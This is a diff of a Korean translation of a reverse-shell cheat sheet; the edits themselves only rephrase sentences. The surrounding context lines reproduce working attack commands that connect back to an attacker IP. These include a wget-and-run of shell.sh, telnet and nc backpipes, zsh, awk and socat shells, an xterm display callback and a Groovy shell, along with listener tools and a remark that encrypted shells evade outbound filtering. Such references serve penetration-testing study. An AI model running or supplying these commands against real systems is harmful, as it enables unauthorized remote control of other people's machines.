@@ -47,7 +47,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Linux 기반 웹 애플리케이션에서 **원격 코드 실행 (RCE)** 취약점을 다룰 때, 리버스 셸을 얻는 것은 iptables 규칙이나 복잡한 패킷 필터링 메커니즘과 같은 네트워크 방어에 의해 방해받을 수 있습니다. 이러한 제한된 환경에서는 손상된 시스템과 더 효과적으로 상호작용하기 위해 PTY (가상 터미널) 셸을 설정하는 대안적 접근 방식이 있습니다.
+Linux 기반 웹 애플리케이션에서 **원격 코드 실행 (RCE)** 취약점을 다룰 때, 리버스 셸을 얻는 것이 iptables 규칙이나 복잡한 패킷 필터링 메커니즘과 같은 네트워크 방어에 의해 방해받을 수 있습니다. 이러한 제한된 환경에서는 손상된 시스템과 더 효과적으로 상호작용하기 위해 PTY (가상 터미널) 셸을 설정하는 대안적 접근 방식이 있습니다.
 
 이 목적을 위해 추천되는 도구는 [toboggan](https://github.com/n3rada/toboggan.git)으로, 이는 대상 환경과의 상호작용을 단순화합니다.
 
@@ -118,7 +118,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-명령을 보내려면 입력하고 Enter를 누른 다음 CTRL+D를 누릅니다 (STDIN을 중지하려면).
+명령을 보내려면 입력하고, Enter를 누르고, CTRL+D를 눌러 STDIN을 중지합니다.
 
 **희생자**
 ```bash
@@ -226,7 +226,7 @@ zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPL
 ```
 ## Rustcat (rcat)
 
-[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – Rust로 작성된 현대적인 netcat 유사 리스너 (2024년부터 Kali에 패키징됨).
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – 현대적인 netcat과 유사한 리스너로 Rust로 작성됨 (2024년부터 Kali에 패키징됨).
 ```bash
 # Attacker – interactive TLS listener with history & tab-completion
 rcat listen -ib 55600
@@ -259,7 +259,7 @@ revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
 - `-p socks5://127.0.0.1:9050` : TOR/HTTP/SOCKS를 통한 프록시
 - `-t` : TUN 인터페이스 생성 (리버스 VPN)
 
-전체 세션이 암호화되고 다중화되기 때문에, 일반 텍스트 `/dev/tcp` 셸을 차단할 수 있는 간단한 아웃바운드 필터링을 종종 우회합니다.
+전체 세션이 암호화되고 다중화되기 때문에, 일반 텍스트 `/dev/tcp` 셸을 종료시킬 수 있는 간단한 아웃바운드 필터링을 종종 우회합니다.
 
 ## OpenSSL
 
@@ -295,13 +295,13 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
-## 핑거
+## Finger
 
 **공격자**
 ```bash
 while true; do nc -l 79; done
 ```
-명령을 보내려면 입력하고 Enter를 누른 다음 CTRL+D를 눌러 STDIN을 중지합니다.
+명령을 보내려면 입력하고 Enter를 누른 다음 CTRL+D를 누릅니다 (STDIN을 중지하려면).
 
 **희생자**
 ```bash
@@ -334,7 +334,7 @@ close(Service)
 ```
 ## Xterm
 
-이것은 포트 6001에서 귀하의 시스템에 연결을 시도합니다:
+이것은 포트 6001에서 귀하의 시스템에 연결을 시도할 것입니다:
 ```bash
 xterm -display 10.0.0.1:1
 ```
@@ -347,7 +347,7 @@ Xnest :1
 ```
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 주의: Java 리버스 셸은 Groovy에도 작동합니다.
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 주의: Java reverse shell은 Groovy에서도 작동합니다.
 ```bash
 String host="localhost";
 int port=8044;
